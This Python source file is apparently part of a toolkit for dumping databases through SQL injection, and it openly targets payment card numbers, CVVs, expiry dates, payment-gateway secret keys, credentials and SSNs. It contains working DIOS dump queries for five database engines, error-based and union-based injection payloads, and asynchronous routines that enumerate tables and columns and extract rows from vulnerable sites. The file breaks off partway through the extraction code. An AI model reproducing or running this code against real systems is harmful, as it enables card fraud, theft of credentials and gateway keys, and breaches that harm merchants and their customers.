"""
SQL Injection Data Dumper — DIOS + Targeted extraction

Extracts data from vulnerable databases using:
1. DIOS (Dump In One Shot) — single-query full schema/data extraction
2. Targeted mode — whitelist-based extraction focusing on card/payment data
3. Table/column enumeration
4. Iterative data extraction for union-based injections

Primary focus: Card data, payment info, credentials, gateway keys
"""

import re
import asyncio
import aiohttp
import csv
import json
import os
import random
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlencode
from loguru import logger

from sqli_scanner import SQLiResult, SQLiScanner
from blind_dumper import BlindDumper, BlindDumpResult

# v3.2 Advanced techniques
try:
    from advanced_techniques import (
        luhn_check,
        has_luhn_valid_card,
        early_card_check,
        is_real_card,
        bin_lookup_api,
        CrossDatabasePivoter,
        ConfigCredentialParser,
        BinaryBlindExtractor,
    )
    HAS_ADVANCED = True
except ImportError:
    HAS_ADVANCED = False


@dataclass
class DumpedData:
    """Container for dumped database data."""
    url: str
    dbms: str
    database: str = ""
    tables: Dict[str, List[str]] = field(default_factory=dict)  # table: [columns]
    data: Dict[str, List[Dict]] = field(default_factory=dict)  # table: [{col: val}]
    card_data: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    gateway_keys: List[Dict] = field(default_factory=list)
    raw_dumps: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    @property 
    def total_rows(self) -> int:
        return sum(len(rows) for rows in self.data.values())
    
    @property
    def has_valuable_data(self) -> bool:
        return bool(self.card_data or self.credentials or self.gateway_keys)


class SQLiDumper:
    """Extracts data from SQL injection vulnerable targets."""
    
    # High-value table names (whitelist for targeted mode)
    TARGET_TABLES = {
        # ---- Card / payment tables (highest priority) ----
        "cards": [
            "cards", "credit_cards", "creditcards", "cc", "card_info",
            "payment_cards", "billing_cards", "card_details", "carddata",
            "stored_cards", "customer_cards", "user_cards", "payment_methods",
            "saved_cards", "card_tokens", "payment_profiles",
        ],
        "payments": [
            "payments", "payment", "transactions", "transaction", "orders",
            "order", "billing", "invoices", "invoice", "purchases",
            "checkout", "sales", "cart", "shopping_cart",
            "sales_order_payment", "order_payment", "payment_info",
            "payment_transaction", "payment_log", "payment_history",
            "stripe_payments", "paypal_payments", "braintree_transactions",
        ],
        # ---- Gateway keys / config (Stripe, PayPal, etc.) ----
        # NOTE: Only specific payment-related config tables — generic names like
        # "config", "settings", "options" removed to avoid dumping CMS junk
        "gateway_config": [
            "wp_options",
            "core_config_data", "site_settings",
            "api_keys", "secrets", "credentials",
            "payment_gateway", "payment_gateways", "gateway_settings",
            "stripe_settings", "paypal_settings", "braintree_settings",
            "wp_woocommerce_api_keys", "wp_woocommerce_payment_tokens",
            "vault_payment_token", "oauth_token",
            "payment_config", "payment_settings",
        ],
        # ---- WooCommerce payment-specific tables ----
        "woo_payments": [
            "wp_woocommerce_order_items", "wp_wc_orders",
            "wp_woocommerce_payment_tokens", "wp_wc_order_stats",
            "wp_wc_customer_lookup",
        ],
        # ---- Magento payment-specific tables ----
        "magento_payments": [
            "sales_order", "sales_order_payment", "sales_flat_order_payment",
            "vault_payment_token", "customer_entity",
        ],
    }
    
    # High-value column names — focused on cards, payments, and gateway keys
    TARGET_COLUMNS = {
        "card_data": [
            "card_number", "cardnumber", "card_num", "cardnum", "cc_number",
            "ccnumber", "cc_num", "ccnum", "pan", "pan_number", "credit_card",
            "creditcard", "card_no", "cardno", "account_number", "acct_number",
            "debit_card", "card", "card_token", "payment_token",
            "card_fingerprint", "card_last4", "last_four", "last4",
        ],
        "card_security": [
            "cvv", "cvc", "cvv2", "cvc2", "security_code", "securitycode",
            "card_code", "cardcode", "cv2", "ccv", "verification",
        ],
        "card_expiry": [
            "expiry", "expiry_date", "exp_date", "expdate", "exp_month",
            "exp_year", "expmonth", "expyear", "expiration", "expires",
            "card_expiry", "valid_thru", "valid_until", "mm_yy", "mmyy",
        ],
        "card_holder": [
            "cardholder", "card_holder", "cardholder_name", "name_on_card",
            "card_name", "billing_name", "holder_name",
        ],
        "gateway_keys": [
            "stripe_key", "stripe_secret", "pk_live", "sk_live",
            "publishable_key", "secret_key", "api_key", "apikey",
            "api_secret", "apisecret", "merchant_id", "merchant_key",
            "private_key", "public_key", "access_token", "auth_key",
            "braintree_key", "paypal_key", "paypal_secret",
            "client_id", "client_secret", "consumer_key", "consumer_secret",
            "webhook_secret", "signing_secret", "payment_key",
            "gateway_token", "gateway_key", "payment_secret",
        ],
        "billing": [
            "billing_address", "billing_city", "billing_state",
            "billing_zip", "billing_country", "billing_phone",
            "ssn", "social_security", "tax_id", "ein",
        ],
        "transaction": [
            "amount", "total", "subtotal", "currency", "payment_status",
            "payment_method", "payment_type", "transaction_id", "txn_id",
            "order_total", "grand_total", "charge_id", "refund_amount",
        ],
    }
    
    # DIOS (Dump In One Shot) queries per DBMS
    DIOS_QUERIES = {
        "mysql": (
            "(SELECT (@a) FROM (SELECT (@a:=0x00), "
            "(SELECT (@a) FROM information_schema.columns "
            "WHERE table_schema=database() AND "
            "@a:=CONCAT(@a,0x3c62723e,table_name,0x3a3a,column_name)))a)"
        ),
        "mysql_data": (
            "(SELECT (@a) FROM (SELECT (@a:=0x00), "
            "(SELECT (@a) FROM {table} "
            "WHERE @a:=CONCAT(@a,0x3c62723e,{columns}) LIMIT {limit}))a)"
        ),
        "mssql": (
            "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
            "table_name+CHAR(58)+CHAR(58)+column_name "
            "FROM information_schema.columns "
            "WHERE table_catalog=DB_NAME() FOR XML PATH('')),1,0,'')"
        ),
        "postgresql": (
            "array_to_string(ARRAY(SELECT table_name||'::'||column_name "
            "FROM information_schema.columns "
            "WHERE table_catalog=current_database()),chr(10))"
        ),
        # Oracle DIOS — uses DBMS_XMLGEN to dump schema in one shot
        "oracle": (
            "DBMS_XMLGEN.GETXML("
            "'SELECT table_name||chr(58)||chr(58)||column_name AS c "
            "FROM all_tab_columns WHERE owner=SYS_CONTEXT(''USERENV'',''CURRENT_SCHEMA'')')"
        ),
        "oracle_data": (
            "DBMS_XMLGEN.GETXML("
            "'SELECT {columns} FROM {table} WHERE ROWNUM<={limit}')"
        ),
        # SQLite DIOS — dumps all tables + columns from sqlite_master
        "sqlite": (
            "GROUP_CONCAT(tbl_name||CHAR(58)||CHAR(58)||sql,CHAR(60)||CHAR(98)||CHAR(114)||CHAR(62)) "
            "FROM sqlite_master WHERE type='table'"
        ),
        "sqlite_data": (
            "GROUP_CONCAT({columns},CHAR(60)||CHAR(98)||CHAR(114)||CHAR(62)) "
            "FROM {table} LIMIT {limit}"
        ),
    }

    def __init__(self, scanner: SQLiScanner = None, output_dir: str = None,
                 max_rows: int = 500, timeout: int = 20,
                 blind_enabled: bool = True, blind_time_delay: float = 3.0,
                 blind_max_rows: int = 50):
        self.scanner = scanner or SQLiScanner(timeout=timeout)
        self.output_dir = output_dir or os.path.join(os.path.dirname(__file__), "dumps")
        self.max_rows = max_rows
        self.timeout = timeout
        self.blind_enabled = blind_enabled
        
        # Initialize blind dumper
        self.blind_dumper = BlindDumper(
            scanner=self.scanner,
            time_delay=blind_time_delay,
            max_rows=blind_max_rows,
            max_string_len=256,
            timeout=timeout,
        ) if blind_enabled else None
        
        os.makedirs(self.output_dir, exist_ok=True)
    
    def _is_target_table(self, table_name: str) -> bool:
        """Check if table name matches any high-value target.
        
        Matching rules:
        1. Exact full-name match (e.g. "wp_options" == "wp_options")
        2. Multi-word target: must appear as contiguous substring in table name
           (e.g. "payment_gateway" in "my_payment_gateway_log")
        3. Single-word target: must appear as a complete segment split on _/./-
           (e.g. "payment" in "sales_payment" but NOT "files" in "payment_profiles")
        """
        table_lower = table_name.lower().strip()
        segments = set(re.split(r'[_.\-]', table_lower))
        for category, names in self.TARGET_TABLES.items():
            for name in names:
                # Exact full-name match
                if name == table_lower:
                    return True
                # Multi-word target: contiguous substring check
                if '_' in name or '.' in name:
                    if name in table_lower:
                        return True
                else:
                    # Single-word target: must be a full segment
                    if name in segments:
                        return True
        return False
    
    def _is_target_column(self, column_name: str) -> Optional[str]:
        """Check if column name matches any high-value target. Returns category."""
        col_lower = column_name.lower()
        for category, names in self.TARGET_COLUMNS.items():
            for name in names:
                if name == col_lower or name in col_lower:
                    return category
        return None
    
    def _categorize_row(self, row: Dict[str, str]) -> Dict[str, List[Dict]]:
        """Categorize a data row into card_data, credentials, gateway_keys."""
        categorized = {"card_data": [], "credentials": [], "gateway_keys": []}
        
        card_entry = {}
        cred_entry = {}
        key_entry = {}
        
        for col, val in row.items():
            if not val or val.lower() in ("null", "none", ""):
                continue
            
            category = self._is_target_column(col)
            if category in ("card_data", "card_security", "card_expiry", "card_holder"):
                card_entry[col] = val
            elif category in ("credentials", "emails", "usernames"):
                cred_entry[col] = val
            elif category == "gateway_keys":
                key_entry[col] = val
            elif category in ("billing", "transaction"):
                card_entry[col] = val  # Billing/transaction goes with card data
        
        # Also check values for patterns regardless of column names
        for col, val in row.items():
            if not val:
                continue
            val_str = str(val)
            # Stripe keys
            if re.match(r'pk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            elif re.match(r'sk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            elif re.match(r'rk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            # AWS keys
            elif re.match(r'AKIA[0-9A-Z]{16}', val_str):
                key_entry[col] = val_str
            # Card numbers (Luhn-checkable 13-19 digit numbers)
            elif re.match(r'^[3-6]\d{12,18}$', val_str.replace(" ", "").replace("-", "")):
                card_entry[col] = val_str
        
        # Only count as a card if there's an actual card number
        has_card_number = any(
            re.match(r'^[3-6]\d{12,18}$', str(v).replace(' ', '').replace('-', ''))
            for v in card_entry.values()
        ) if card_entry else False
        if card_entry and has_card_number:
            categorized["card_data"].append(card_entry)
        if cred_entry:
            categorized["credentials"].append(cred_entry)
        if key_entry:
            categorized["gateway_keys"].append(key_entry)
        
        return categorized

    def _determine_prefix_suffix(self, sqli: SQLiResult, original_value: str) -> tuple:
        """Determine injection prefix and suffix from SQLiResult.
        
        Uses the scanner-detected prefix/suffix fields when available,
        falls back to heuristic detection for backward compatibility.
        
        Returns:
            (prefix, suffix, is_replace) tuple ready for UNION injection.
            prefix includes 'AND 1=2' to suppress original rows.
            is_replace: if True, the prefix REPLACES the original param value
                        (numeric styles like -1, 999999.9); if False, it's
                        appended after the original value.
        """
        # Suffix: only default to '-- -' if scanner didn't set it at all
        # Ensure suffix always has a leading space for safe SQL comment
        suffix = getattr(sqli, 'suffix', None)
        if suffix is None:
            suffix = ' -- -'
        elif suffix and not suffix.startswith(' '):
            suffix = f' {suffix}'
        
        scanner_prefix = getattr(sqli, 'prefix', None)
        
        if scanner_prefix:
            # Scanner-detected prefix: numeric replaces, string appends
            is_numeric_style = scanner_prefix in ("-1", "999999.9") or scanner_prefix.endswith(")")
            if is_numeric_style:
                return (f"{scanner_prefix} AND 1=2 ", suffix, True)
            else:
                return (f"{scanner_prefix} AND 1=2 ", suffix, False)
        
        # Legacy fallback: infer from original param value / payload_used
        prefix = "' AND 1=2 "
        if original_value.lstrip('-').isdigit():
            prefix = " AND 1=2 "
        elif sqli.payload_used:
            p = sqli.payload_used.strip()
            if not p.startswith("'") and not p.startswith('"'):
                prefix = " AND 1=2 "
        
        return (prefix, suffix, False)

    def _inject_value(self, original: str, query: str, is_replace: bool) -> str:
        """Build the parameter value for injection.
        
        If is_replace, the query already includes a prefix that replaces
        the original value (numeric styles like -1). Otherwise, append
        the injection after the original value.
        """
        if is_replace:
            return query
        return f"{original}{query}"

    def _suffix_str(self, suffix: str) -> str:
        """Ensure suffix has a leading space for safe SQL comment."""
        if suffix and not suffix.startswith(" "):
            return f" {suffix}"
        return suffix

    async def _error_extract(self, sqli: SQLiResult, session: aiohttp.ClientSession,
                              subquery: str) -> Optional[str]:
        """Extract a single value using error-based injection.
        
        Tries multiple error-based techniques until one succeeds:
        1. The technique that originally detected the SQLi
        2. EXTRACTVALUE (cleanest extraction, ~32 char limit)
        3. FLOOR/RAND (longer output, but regex can be tricky)
        4. UPDATEXML (fallback)
        
        Args:
            sqli: SQLiResult with error injection_type
            session: aiohttp session
            subquery: SQL subquery to extract (without outer parens)
            
        Returns:
            Extracted string value, or None
        """
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        # Determine injection prefix from the payload that originally worked
        payload_used = sqli.payload_used or ''
        technique = getattr(sqli, 'technique', '') or ''
        
        if payload_used.startswith("'"):
            prefix = "' AND "
            suffix = '-- -'
        elif payload_used.startswith('"'):
            prefix = '" AND '
            suffix = '-- -'
        elif payload_used.lstrip().startswith('AND') or payload_used.lstrip().startswith('('):
            prefix = ' AND '
            suffix = '-- -'
        else:
            if original.lstrip('-').replace('.', '').isdigit():
                prefix = ' AND '
            else:
                prefix = "' AND "
            suffix = '-- -'
        
        # Build ordered list of techniques to try
        injections = []
        
        if sqli.dbms in ("mysql", ""):
            # Always try EXTRACTVALUE first (cleanest parsing, ~32 chars)
            injections.append(f"{prefix}EXTRACTVALUE(1,CONCAT(0x7e,({subquery}),0x7e)) {suffix}")
            # Then UPDATEXML
            injections.append(f"{prefix}UPDATEXML(1,CONCAT(0x7e,({subquery}),0x7e),1) {suffix}")
            # Then FLOOR/RAND (can extract more data but regex is fragile)
            injections.append(
                f"{prefix}(SELECT 1 FROM (SELECT COUNT(*),CONCAT("
                f"({subquery}),FLOOR(RAND(0)*2))x FROM "
                f"information_schema.tables GROUP BY x)a) {suffix}"
            )
        elif sqli.dbms == "mssql":
            injections.append(f"{prefix}1=CONVERT(int,({subquery})) {suffix}")
        elif sqli.dbms == "postgresql":
            injections.append(f"{prefix}1=CAST(({subquery}) AS int) {suffix}")
        elif sqli.dbms == "oracle":
            injections.append(f"{prefix}1=CTXSYS.DRITHSX.SN(1,({subquery})) {suffix}")
        else:
            injections.append(f"{prefix}EXTRACTVALUE(1,CONCAT(0x7e,({subquery}),0x7e)) {suffix}")
            injections.append(
                f"{prefix}(SELECT 1 FROM (SELECT COUNT(*),CONCAT("
                f"({subquery}),FLOOR(RAND(0)*2))x FROM "
                f"information_schema.tables GROUP BY x)a) {suffix}"
            )
        
        for injection in injections:
            test_params = params.copy()
            test_params[sqli.parameter] = [str(original) + injection]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if not body:
                continue
            
            val = self._parse_error_value(body)
            if val:
                return val
        
        return None

    def _parse_error_value(self, body: str) -> Optional[str]:
        """Extract value from an error message in the response body.
        
        Supports MySQL EXTRACTVALUE/UPDATEXML (~val~), FLOOR/RAND (Duplicate entry),
        MSSQL CONVERT, PostgreSQL CAST error patterns.
        """
        # EXTRACTVALUE/UPDATEXML: ~data~
        m = re.search(r"XPATH syntax error:\s*'~(.+?)~'", body, re.I)
        if m:
            return m.group(1).strip()
        
        # FLOOR/RAND: Duplicate entry 'data[0|1]' for key
        # FLOOR(RAND(0)*2) appends 0 or 1 — use greedy match up to last digit before ' for key
        m = re.search(r"Duplicate entry '(.+?)[01]' for key", body, re.I)
        if m:
            return m.group(1).strip()
        
        # MSSQL CONVERT
        m = re.search(r"Conversion failed when converting.*?value '(.+?)'", body, re.I | re.S)
        if m:
            return m.group(1).strip()
        
        # PostgreSQL CAST
        m = re.search(r'invalid input syntax for.*?"(.+?)"', body, re.I)
        if m:
            return m.group(1).strip()
        
        # Oracle CTXSYS
        m = re.search(r'ORA-\d+.*?:(.*?)$', body, re.I | re.M)
        if m:
            val = m.group(1).strip()
            if val and len(val) > 1:
                return val
        
        # Generic: look for common error patterns with embedded data
        m = re.search(r"(?:subquery returns|near) '(.+?)'", body, re.I)
        if m:
            val = m.group(1).strip()
            if val and len(val) > 2:
                return val
        
        return None

    async def enumerate_tables(self, sqli: SQLiResult, 
                               session: aiohttp.ClientSession) -> List[str]:
        """Enumerate database tables through SQL injection.
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            List of table names
        """
        tables = []
        scanner = self.scanner
        base_url = sqli.url
        param = sqli.parameter
        
        base, params = scanner._parse_url(base_url)
        original = params[param][0] if isinstance(params[param], list) else params[param]
        
        # Determine injection prefix/suffix using scanner-detected values
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        if sqli.injection_type == "union" and sqli.injectable_columns:
            null_list = ["NULL"] * sqli.column_count
            
            if sqli.dbms in ("mysql", ""):
                # MySQL: Extract from information_schema
                marker_start_str = f"mds{random.randint(10000, 99999)}"
                marker_end_str = f"mde{random.randint(10000, 99999)}"
                marker_start_hex = marker_start_str.encode().hex()
                marker_end_hex = marker_end_str.encode().hex()
                
                # Try each injectable column until one reflects
                for col_idx in sqli.injectable_columns:
                    for offset in range(0, 200, 20):
                        null_list_copy = null_list.copy()
                        null_list_copy[col_idx] = (
                            f"CONCAT(0x{marker_start_hex},"
                            f"GROUP_CONCAT(table_name SEPARATOR 0x2c),"
                            f"0x{marker_end_hex})"
                        )
                        
                        query = (
                            f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                            f"FROM information_schema.tables "
                            f"WHERE table_schema=database() "
                            f"LIMIT {offset},20{suffix}"
                        )
                        
                        test_params = params.copy()
                        test_params[param] = [self._inject_value(original, query, is_replace)]
                        test_url = scanner._build_url(base, test_params)
                    
                        body, _ = await scanner._fetch(test_url, session)
                        if body:
                            match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body)
                            if match:
                                found = match.group(1).split(",")
                                tables.extend(found)
                                if len(found) < 20:
                                    break
                            else:
                                break
                    # If we found tables with this column, stop trying others
                    if tables:
                        break
            
            elif sqli.dbms == "mssql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "name"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM sysobjects WHERE xtype='U'{suffix}"
                    )
                    test_params = params.copy()
                    test_params[param] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for t in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
                                tables.append(t)
                    if tables:
                        break
            
            elif sqli.dbms == "postgresql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "tablename"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM pg_tables WHERE schemaname='public'{suffix}"
                    )
                    test_params = params.copy()
                    test_params[param] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for t in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
                                tables.append(t)
                    if tables:
                        break
        
        # Deduplicate
        tables = list(dict.fromkeys(tables))
        
        # Fallback: if GROUP_CONCAT returned 0 tables, try per-row extraction
        if not tables and sqli.injection_type == "union" and sqli.injectable_columns:
            if sqli.dbms in ("mysql", ""):
                marker_s = f"mts{random.randint(10000, 99999)}"
                marker_e = f"mte{random.randint(10000, 99999)}"
                ms_hex = marker_s.encode().hex()
                me_hex = marker_e.encode().hex()
                
                for col_idx in sqli.injectable_columns[:2]:
                    null_list_copy = ["NULL"] * sqli.column_count
                    null_list_copy[col_idx] = f"CONCAT(0x{ms_hex},table_name,0x{me_hex})"
                    
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.tables "
                        f"WHERE table_schema=database(){suffix}"
                    )
                    test_params = params.copy()
                    test_params[param] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for m in re.finditer(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body):
                            tname = m.group(1).strip()
                            if tname and tname.lower() not in ("null",):
                                tables.append(tname)
                    if tables:
                        break
                
                tables = list(dict.fromkeys(tables))
                if tables:
                    logger.info(f"Fallback enumerated {len(tables)} tables from {base_url}")
        
        # ── Error-based table enumeration ──
        if not tables and sqli.injection_type == "error":
            logger.info(f"Attempting error-based table enumeration for {base_url}")
            if sqli.dbms in ("mysql", ""):
                # Try GROUP_CONCAT first (returns up to ~1024 chars)
                val = await self._error_extract(
                    sqli, session,
                    "SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
                    "FROM information_schema.tables WHERE table_schema=database()"
                )
                if val and ',' in val:
                    tables = [t.strip() for t in val.split(',') if t.strip()]
                elif val:
                    tables = [val.strip()]
                
                # If GROUP_CONCAT was truncated or failed, try per-row
                if not tables or (len(tables) == 1 and len(tables[0]) > 28):
                    tables = []
                    for i in range(50):
                        val = await self._error_extract(
                            sqli, session,
                            f"SELECT table_name FROM information_schema.tables "
                            f"WHERE table_schema=database() LIMIT {i},1"
                        )
                        if not val:
                            break
                        tables.append(val.strip())
                        await asyncio.sleep(0.2)
            
            elif sqli.dbms == "mssql":
                seen = set()
                for i in range(50):
                    not_in = ",".join(f"'{t}'" for t in seen) if seen else "''"
                    val = await self._error_extract(
                        sqli, session,
                        f"SELECT TOP 1 table_name FROM information_schema.tables "
                        f"WHERE table_type='BASE TABLE' AND table_name NOT IN ({not_in})"
                    )
                    if not val or val in seen:
                        break
                    tables.append(val.strip())
                    seen.add(val.strip())
                    await asyncio.sleep(0.2)
            
            elif sqli.dbms == "postgresql":
                for i in range(50):
                    val = await self._error_extract(
                        sqli, session,
                        f"SELECT tablename FROM pg_tables "
                        f"WHERE schemaname='public' LIMIT 1 OFFSET {i}"
                    )
                    if not val:
                        break
                    tables.append(val.strip())
                    await asyncio.sleep(0.2)
            
            tables = list(dict.fromkeys(tables))
            if tables:
                logger.info(f"Error-based enumerated {len(tables)} tables from {base_url}")

        logger.info(f"Enumerated {len(tables)} tables from {base_url}")
        return tables

    async def enumerate_columns(self, sqli: SQLiResult, table: str,
                                 session: aiohttp.ClientSession) -> List[str]:
        """Enumerate columns for a specific table.
        
        Args:
            sqli: SQLi vulnerability result
            table: Table name to enumerate columns for
            session: aiohttp session
            
        Returns:
            List of column names
        """
        columns = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        # Determine injection prefix/suffix using scanner-detected values
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        if sqli.injection_type == "union" and sqli.injectable_columns:
            null_list = ["NULL"] * sqli.column_count
            
            if sqli.dbms in ("mysql", ""):
                marker_start_str = f"mcs{random.randint(10000, 99999)}"
                marker_end_str = f"mce{random.randint(10000, 99999)}"
                marker_start_hex = marker_start_str.encode().hex()
                marker_end_hex = marker_end_str.encode().hex()
                
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = (
                        f"CONCAT(0x{marker_start_hex},"
                        f"GROUP_CONCAT(column_name SEPARATOR 0x2c),"
                        f"0x{marker_end_hex})"
                    )
                    
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.columns "
                        f"WHERE table_schema=database() AND table_name='{table}'{suffix}"
                    )
                    
                    test_params = params.copy()
                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body)
                        if match:
                            columns = match.group(1).split(",")
                    if columns:
                        break
            
            elif sqli.dbms == "mssql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "column_name"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.columns "
                        f"WHERE table_name='{table}'{suffix}"
                    )
                    test_params = params.copy()
                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for c in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
                                columns.append(c)
                    if columns:
                        break
            
            elif sqli.dbms == "postgresql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "column_name"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.columns "
                        f"WHERE table_name='{table}'{suffix}"
                    )
                    test_params = params.copy()
                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for c in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
                                columns.append(c)
                    if columns:
                        break
        
        # ── Error-based column enumeration ──
        if not columns and sqli.injection_type == "error":
            logger.info(f"Attempting error-based column enumeration for table '{table}'")
            # Use hex encoding for table name to avoid quote conflicts in injection
            table_hex = f"0x{table.encode().hex()}"
            
            if sqli.dbms in ("mysql", ""):
                # Try GROUP_CONCAT first
                val = await self._error_extract(
                    sqli, session,
                    f"SELECT GROUP_CONCAT(column_name SEPARATOR 0x2c) "
                    f"FROM information_schema.columns "
                    f"WHERE table_schema=database() AND table_name={table_hex}"
                )
                if val and ',' in val:
                    columns = [c.strip() for c in val.split(',') if c.strip()]
                elif val:
                    columns = [val.strip()]
                
                # Per-row fallback if GROUP_CONCAT truncated
                if not columns or (len(columns) == 1 and len(columns[0]) > 28):
                    columns = []
                    for i in range(60):
                        val = await self._error_extract(
                            sqli, session,
                            f"SELECT column_name FROM information_schema.columns "
                            f"WHERE table_schema=database() AND table_name={table_hex} LIMIT {i},1"
                        )
                        if not val:
                            break
                        columns.append(val.strip())
                        await asyncio.sleep(0.15)
            
            elif sqli.dbms == "mssql":
                seen = set()
                for i in range(60):
                    not_in = ",".join(f"'{c}'" for c in seen) if seen else "''"
                    val = await self._error_extract(
                        sqli, session,
                        f"SELECT TOP 1 column_name FROM information_schema.columns "
                        f"WHERE table_name={table_hex} AND column_name NOT IN ({not_in})"
                    )
                    if not val or val in seen:
                        break
                    columns.append(val.strip())
                    seen.add(val.strip())
                    await asyncio.sleep(0.15)
            
            elif sqli.dbms == "postgresql":
                for i in range(60):
                    val = await self._error_extract(
                        sqli, session,
                        f"SELECT column_name FROM information_schema.columns "
                        f"WHERE table_name={table_hex} LIMIT 1 OFFSET {i}"
                    )
                    if not val:
                        break
                    columns.append(val.strip())
                    await asyncio.sleep(0.15)
            
            columns = list(dict.fromkeys(columns))
            if columns:
                logger.info(f"Error-based enumerated {len(columns)} columns from '{table}'")

        columns = list(dict.fromkeys(columns))
        logger.info(f"Enumerated {len(columns)} columns from table '{table}'")
        return columns

    async def extract_data(self, sqli: SQLiResult, table: str, columns: List[str],
                           session: aiohttp.ClientSession, limit: int = None) -> List[Dict]:
        """Extract actual data from a table using union or error-based injection.
        
        Args:
            sqli: SQLi vulnerability result
            table: Table to extract from
            columns: Columns to extract
            session: aiohttp session
            limit: Max rows to extract
            
        Returns:
            List of row dictionaries
        """
        if limit is None:
            limit = self.max_rows
        
        rows = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        # ── Error-based extraction ──
        if sqli.injection_type == "error":
            logger.info(f"Error-based data extraction from {table} ({len(columns)} cols, limit={limit})")
            max_err_rows = min(limit, 30)  # Error-based is slow, cap at 30
            
            if sqli.dbms in ("mysql", ""):
                # Extract row by row, column by column via CONCAT
                for row_idx in range(max_err_rows):
                    # Build CONCAT of all columns
                    concat_parts = ",".join([f"IFNULL({c},'NULL')" for c in columns])
                    val = await self._error_extract(
                        sqli, session,
                        f"SELECT CONCAT_WS(0x7c7c,{concat_parts}) FROM {table} LIMIT {row_idx},1"
                    )
                    if not val:
                        # CONCAT may be too long for error (~32 char limit), try column-by-column
                        if row_idx == 0 and len(columns) > 2:
                            row = {}
                            for col in columns:
                                cval = await self._error_extract(
                                    sqli, session,
                                    f"SELECT IFNULL({col},'NULL') FROM {table} LIMIT {row_idx},1"
                                )
                                if cval is not None:
                                    row[col] = cval
                                await asyncio.sleep(0.1)
                            if row:
                                rows.append(row)
                                # Continue column-by-column for remaining rows
                                for ri in range(1, max_err_rows):
                                    rw = {}
                                    for col in columns:
                                        cv = await self._error_extract(
                                            sqli, session,
                                            f"SELECT IFNULL({col},'NULL') FROM {table} LIMIT {ri},1"
                                        )
                                        if cv is not None:
                                            rw[col] = cv
                                        await asyncio.sleep(0.1)
                                    if not rw:
                                        break
                                    rows.append(rw)
                        break
                    
                    values = val.split("||")
                    if len(values) == len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                    elif len(values) > len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                    else:
                        # Partial data — still useful
                        row = {}
                        for i, v in enumerate(values):
                            if i < len(columns):
                                row[columns[i]] = v.strip()
                        if row:
                            rows.append(row)
                    await asyncio.sleep(0.2)
            
            elif sqli.dbms == "mssql":
                for row_idx in range(max_err_rows):
                    concat_parts = "+CHAR(124)+CHAR(124)+".join(
